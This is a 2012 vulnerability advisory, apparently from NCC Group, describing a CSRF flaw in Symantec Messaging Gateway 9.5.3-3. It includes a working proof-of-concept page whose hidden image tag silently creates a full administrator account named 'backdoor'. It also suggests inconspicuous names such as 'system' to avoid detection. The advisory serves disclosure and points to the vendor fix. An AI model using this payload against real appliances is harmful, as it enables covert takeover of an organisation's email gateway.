@@ -1,0 +1,77 @@
+=======
+Summary
+=======
+Name: Symantec Messaging Gateway - Easy CSRF to add a backdoor-administrator (for example)
+Release Date: 30 November 2012
+Reference: NGS00263
+Discoverer: Ben Williams <ben.williams@ngssecure.com>
+Vendor: Symantec
+Vendor Reference: 
+Systems Affected: Symantec Messaging Gateway 9.5.3-3
+Risk: High
+Status: Published
+
+========
+TimeLine
+========
+Discovered: 16 April 2012
+Released: 16 April 2012
+Approved: 29 April 2012
+Reported: 30 April 2012
+Fixed: 27 August 2012
+Published: 30 November 2012
+
+===========
+Description
+===========
+I. VULNERABILITY
+-------------------------
+Symantec Messaging Gateway 9.5.3-3 - Easy CSRF to add a backdoor-administrator (for example)
+
+II. BACKGROUND
+-------------------------
+Symantec Messaging Gateway 9.5.3-3 is the latest version, of their Email Security Appliance
+
+III. DESCRIPTION
+-------------------------
+It would be relatively easy for an attacker to add a backdoor-administrator to the system, by getting a logged-in adminstrator to view a webpage with a specially crafted image-tag. This is partly due to the fact that GET and POST requests are interchangeable, there is no password protection on sensitive functions, and there is not CSRF protection in the product.
+
+=================
+Technical Details
+=================
+IV. PROOF OF CONCEPT
+-------------------------
+An attacker can create an web page with a hidden image-tag (example below)
+
+<html>
+A very interesting page indeed
+<img
+src="http://192.168.1.59:41080/brightmail/admin/administrator/save.do?pageReuseFor=add&id=0&userName=backdoor&passwd=muhaha3&confirmPassword=muhaha3&fullAdminRole=true&statusRole=true"
+height=0 width=0>
+</html>
+
+When a logged-in administrator views this page, a new backdoor administrator will be created in the application (as long as the username is unique).
+
+The administrator would not notice anything until they go to here:
+http://192.168.1.59:41080/brightmail/admin/administrator/view.do
+(where they would see the added administrator, but if the username is something like "system" or "filter" they may not notice this as an issue anyway)
+
+The attacker could then use this backdoor administrator to login, control and reconfigure the appliance.
+
+Many other functions can be abused in this way to arbitrarily reconfigure the appliance.
+
+===============
+Fix Information
+===============
+An updated version of the software has been released to address the vulnerability:
+
+http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120827_00
+
+
+NCC Group Research
+http://www.nccgroup.com/research
+
+
+For more information please visit <a href="http://www.mimecast.com">http://www.mimecast.com<br>
+This email message has been delivered safely and archived online by Mimecast.
+</a>
